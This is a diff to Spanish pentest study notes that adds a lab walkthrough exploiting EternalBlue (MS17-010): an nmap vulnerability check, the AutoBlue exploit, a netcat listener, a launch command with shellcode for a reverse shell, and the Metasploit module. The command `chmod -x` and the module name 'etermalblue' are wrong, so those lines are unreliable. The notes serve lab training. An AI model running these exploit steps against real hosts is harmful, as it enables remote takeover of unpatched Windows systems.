@@ -296,10 +296,30 @@ Vamos a proceder a explotar una maquina usando PsExec, primero lo haremos de una
 
 5. Una vez hemos logrado acceso ya solo nos queda buscar la flag para resolver el laboratorio, normalmente esta en la raiz: ![psexec-lab](img/smb-psexec-lab-4.png)
 ---
-#### ****Exploiting Windows MS17-010 SMB Vulnerability (EternalBlue)****
+#### **Exploiting Windows MS17-010 SMB Vulnerability (EternalBlue)**
 
 - [Informacion sobre EternalBlue](../02%20-%20Assessment%20Methodologies/03%20-%20Assesment%20Methodologies-Vulnerability-Assessment.md#eternalblue)
 
+
+#### **Laboratorio EternalBlue**
+
+1. El primer paso es enumerar para ver que encontramos (como siempre), detectamos que hay un servidor SMB corriendo en un Windows server: ![eternal-lab](img/eternal-lab-1.png)
+
+2. Para saber si es vulnerable podemos usar el siguiente script de nmap, el resultado nos confirma que el host es vulnerable: ![eternal-lab](img/eternal-lab-2.png) ![eternal-lab](img/eternal-lab-3.png)
+
+3. Para explotar el SMB vamos a usar un exploit llamado [AutoBlue](https://github.com/3ndG4me/AutoBlue-MS17-010), en el repositorio explica su instalacion y utilizacion.
+
+4. Una vez que tenemos hecha la configuracion del **AutoBlue** antes de lanzarlo deberemos preparar el puerto de escucha con el comando `nc -nvlp 1234` 
+
+5. Ahora antes de lanzarlo tendemos que otorgar permisos de ejecucion a nuestro script, lo haremos con `chmod -x eternalblue_exploit7`
+
+6. Una vez preparados para la escucha ya podremos lanzar `python eternalblue_exploit7 10.10.10.12 shellcode/sc_x64.bin`
+
+7. Si esperamos en la ventana donde estabamos en escucha y todo ha ido bien ya tendremos la consola operativa: ![eternal-lab](img/eternal-lab-4.png)
+
+#### **Laboratorio EternalBlue (metasploit)**
+
+Para automatizar esto con metasploit solo tenemos que buscar el modulo de exploit `exploit/windows/smb/ms17_010_etermalblue` y es practicamente automatico.
 
 
 
